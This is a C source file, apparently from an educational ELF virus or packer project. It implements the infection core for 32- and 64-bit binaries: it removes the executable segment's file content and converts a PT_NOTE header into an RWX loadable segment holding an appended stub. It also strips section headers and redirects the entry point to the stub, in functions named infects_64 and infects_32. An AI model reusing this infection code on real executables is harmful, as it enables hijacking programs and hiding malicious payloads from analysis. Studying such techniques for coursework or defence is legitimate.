#include <ft_famine.h>
#include "stub_code64.h"
#include "stub_code32.h"
/* ------------------------------------------------------------------------- */
/* Class-specific stages: they read/write the real Elf32 / Elf64 structs     */
/* from binary->buffer (or p->target_file) and store results in the shared t_packer. */
/* These are the only functions that must exist in a 32- and a 64-bit form.  */
/* ------------------------------------------------------------------------- */

// Fix up the ELF for the shrunk, redirected image: shift the file offsets of
// everything after the cut, drop the exec segment's file content (p_filesz = 0,
// its memory stays zero-filled), strip the section header table, point e_entry
// at the stub, and turn the hijacked PT_NOTE into the stub's PT_LOAD.
static void patch_elf64(t_packer *p)
{
    Elf64_Ehdr *eh = (Elf64_Ehdr *)p->target_file;
    Elf64_Phdr *ph = (Elf64_Phdr *)(p->target_file + eh->e_phoff);

    for(int i = 0; i < eh->e_phnum; i++)
    {
        if(i == p->ptnote_pos)
            continue;
        if(ph[i].p_offset > p->seg_offset)
            ph[i].p_offset -= p->cut_size;
    }
    ph[p->seg_idx].p_filesz = 0;
    eh->e_shoff    = 0;
    eh->e_shnum    = 0;
    eh->e_shstrndx = 0;
    eh->e_entry    = p->payload_va;

    Elf64_Phdr *ptnote = &ph[p->ptnote_pos];
    ptnote->p_type   = PT_LOAD;
    ptnote->p_offset = p->payload_offset;
    ptnote->p_vaddr  = p->payload_va;
    ptnote->p_paddr  = p->payload_va;
    ptnote->p_filesz = p->payload_size;
    ptnote->p_memsz  = p->payload_size;
    ptnote->p_flags  = PF_R | PF_W | PF_X;
    ptnote->p_align  = PAGE;
}

static void patch_elf32(t_packer *p)
{
    Elf32_Ehdr *eh = (Elf32_Ehdr *)p->target_file;
    Elf32_Phdr *ph = (Elf32_Phdr *)(p->target_file + eh->e_phoff);

    for(int i = 0; i < eh->e_phnum; i++)
    {
        if(i == p->ptnote_pos)
            continue;
        if(ph[i].p_offset > p->seg_offset)
            ph[i].p_offset -= p->cut_size;
    }
    ph[p->seg_idx].p_filesz = 0;
    eh->e_shoff    = 0;
    eh->e_shnum    = 0;
    eh->e_shstrndx = 0;
    eh->e_entry    = p->payload_va;

    Elf32_Phdr *ptnote = &ph[p->ptnote_pos];
    ptnote->p_type   = PT_LOAD;
    ptnote->p_offset = p->payload_offset;
    ptnote->p_vaddr  = p->payload_va;
    ptnote->p_paddr  = p->payload_va;
    ptnote->p_filesz = p->payload_size;
    ptnote->p_memsz  = p->payload_size;
    ptnote->p_flags  = PF_R | PF_W | PF_X;
    ptnote->p_align  = PAGE;
}

/* ------------------------------------------------------------------------- */
/* Class-independent stages: they only touch scalars and raw bytes, so a     */
/* single version serves both ELF32 and ELF64.                               */
/* ------------------------------------------------------------------------- */

// Build the output image with the executable segment removed: copy the
// original with its exec region (cut_size bytes) cut target_file, then append the
// stub+blob at the PAGE-aligned end of the shrunk image.
static bool assemble_output(t_packer *p)
{
    // Bytes kept after the cut. If the exec segment is the last content in the
    // file, seg_offset + cut_size may exceed file_size: there is then no tail.
    size_t tail_off     = p->seg_offset + p->cut_size;
    size_t tail_len     = ((size_t)p->binary->file_size > tail_off) ? (size_t)p->binary->file_size - tail_off : 0;
    size_t reduced_size = p->seg_offset + tail_len;

    p->payload_offset   = (reduced_size + PAGE - 1) & ~(PAGE - 1);
    p->target_size         = p->payload_offset + p->payload_size;
    p->target_file              = ft_calloc(1, p->target_size);
    if(!p->target_file)
    {
        perror("Output allocation failed.");
        return false;
    }
    // Head : [0, seg_offset)
    ft_memcpy(p->target_file, p->binary->buffer, p->seg_offset);
    // Shifted queue : [seg_offset + cut_size, file_size) written at seg_offset
    if(tail_len)
        ft_memcpy(p->target_file + p->seg_offset, p->binary->buffer + tail_off, tail_len);
    // Stub + blob at the reduced, PAGE-aligned end
    ft_memcpy(p->target_file + p->payload_offset, p->payload, p->payload_size);
    return true;
}

// Write the new binary in one shot
static bool write_output(t_packer *p, const char *path)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if(fd == -1)
    {
        perror("Open woody failed.");
        return false;
    }
    if(write(fd, p->target_file, p->target_size) != (ssize_t)p->target_size)
    {
        perror("Write woody failed.");
        close(fd);
        return false;
    }
    close(fd);
    return true;
}
/* ------------------------------------------------------------------------- */
/* Pipelines                                                                 */
/* ------------------------------------------------------------------------- */

// Pipeline: hijack a PT_NOTE, drop the stub past the image, redirect the entry.
int infects_64(t_binary *binary)
{
    t_packer p = {0};
    p.binary = binary;
    if(!elf64_parser(&p))
        return free_packer(&p, 1);
    if(!build_stub(&p, stub_code64, stub_code_len64))
        return free_packer(&p, 1);
    if(!assemble_output(&p))
        return free_packer(&p, 1);
    patch_elf64(&p);
    if(!write_output(&p, "woody"))
        return free_packer(&p, 1);
    return free_packer(&p, 0);
}

int infects_32(t_binary *binary)
{
    t_packer p = {0};
    p.binary = binary;
    if(!elf32_parser(&p))
        return free_packer(&p, 1);
    if(!build_stub(&p, stub_code32, stub_code_len32))
        return free_packer(&p, 1);
    if(!assemble_output(&p))
        return free_packer(&p, 1);
    patch_elf32(&p);
    if(!write_output(&p, "woody"))
        return free_packer(&p, 1);
    return free_packer(&p, 0);
}